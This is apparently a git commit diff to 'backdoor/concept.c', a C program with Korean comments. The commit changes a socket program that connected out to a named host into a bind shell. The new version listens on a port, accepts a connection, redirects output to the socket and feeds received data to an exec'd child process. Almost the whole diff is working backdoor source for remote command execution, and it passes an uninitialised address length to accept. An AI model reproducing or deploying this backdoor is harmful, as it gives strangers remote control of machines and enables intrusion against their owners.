3fe40450c99637609f4549a8c8b28596ebf98208
gbdngb12 <gbdngb12@naver.com>
2023-05-18 17:52:43 +0900

    add concept.c

--- backdoor/concept.c
+++ backdoor/concept.c
@@ -12,39 +12,39 @@
 
 #define MAXDATASIZE 100 /* max number of bytes we can get at once */
 
-int main(int argc, char* argv[]) {
+int main() {
     int pipefd[2];
     pid_t pid;
-    char buffer[256];
-    int sockfd, numbytes;
+    int sockfd, new_fd, numbytes;
     char buf[MAXDATASIZE];
     struct hostent* he;
     struct sockaddr_in their_addr; /* connector's address information */
+    struct sockaddr_in my_addr;    /* my address information */
+    int sin_size;
 
-    if (argc != 2) {
-        fprintf(stderr, "usage: client hostname\n");
-        exit(1);
-    }
-
-    if ((he = gethostbyname(argv[1])) == NULL) { /* get the host info */
-        herror("gethostbyname");
-        exit(1);
-    }
+    my_addr.sin_family = AF_INET;         /* host byte order */
+    my_addr.sin_port = htons(PORT);     /* short, network byte order */
+    my_addr.sin_addr.s_addr = INADDR_ANY; /* auto-fill with my IP */
+    bzero(&(my_addr.sin_zero), 8);        /* zero the rest of the struct */
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
         perror("socket");
         exit(1);
     }
 
-    their_addr.sin_family = AF_INET;   /* host byte order */
-    their_addr.sin_port = htons(PORT); /* short, network byte order */
-    their_addr.sin_addr = *((struct in_addr*)he->h_addr);
-    bzero(&(their_addr.sin_zero), 8); /* zero the rest of the struct */
-
-    if (connect(sockfd, (struct sockaddr*)&their_addr,
-                sizeof(struct sockaddr)) == -1) {
-        perror("connect");
+    if (bind(sockfd, (struct sockaddr*)&my_addr, sizeof(struct sockaddr)) == -1) {
+        perror("bind");
         exit(1);
+    }
+
+    if (listen(sockfd, 10) == -1) {
+        perror("listen");
+        exit(1);
+    }
+
+    if ((new_fd = accept(sockfd, (struct sockaddr*)&their_addr,
+                                 &sin_size)) == -1) {
+                perror("accept");
     }
 
     // 파이프 생성
@@ -68,12 +68,12 @@ int main(int argc, char* argv[]) {
         close(pipefd[1]);
 
         // 표준 출력을 소켓으로 리디렉션
-        if (dup2(sockfd, STDOUT_FILENO) < 0) {
+        if (dup2(new_fd, STDOUT_FILENO) < 0) {
             perror("리디렉션 실패");
             exit(1);
         }
         // 표준 에러를 소켓으로 리디렉션
-        if (dup2(sockfd, STDERR_FILENO) < 0) {
+        if (dup2(new_fd, STDERR_FILENO) < 0) {
             perror("리디렉션 실패");
             exit(1);
         }
@@ -93,28 +93,30 @@ int main(int argc, char* argv[]) {
         // execve() 호출이 성공하지 않은 경우에만 아래 코드가 실행됨
         perror("execve 실패");
         exit(1);
+
     } else {
         // parent process
 
         // 파이프의 읽기 단을 닫음
         close(pipefd[0]);
+        sin_size = sizeof(struct sockaddr_in);
         while (1) {
-            numbytes = recvfrom(sockfd, buf, MAXDATASIZE, 0, 0, 0);
+            numbytes = recvfrom(new_fd, buf, MAXDATASIZE, 0, 0, 0);
             if (numbytes <= 0) {
                 perror("recvfrom");
                 exit(1);
             }
-            buf[numbytes] = '\n';
+            buf[numbytes] = '\0';
             // 메시지를 작성하여 파이프에 씀
             write(pipefd[1], buf, numbytes + 1);
             /**
              * @todo 수행한 명령어가 exit\n인지 확인하고 맞다면 break;
-             * 
+             *
              */
         }
         // 파이프의 쓰기 단을 닫음
         close(pipefd[1]);
-        close(sockfd);// 소켓을 닫음
+        close(sockfd);  // 소켓을 닫음
     }
 
     return 0;
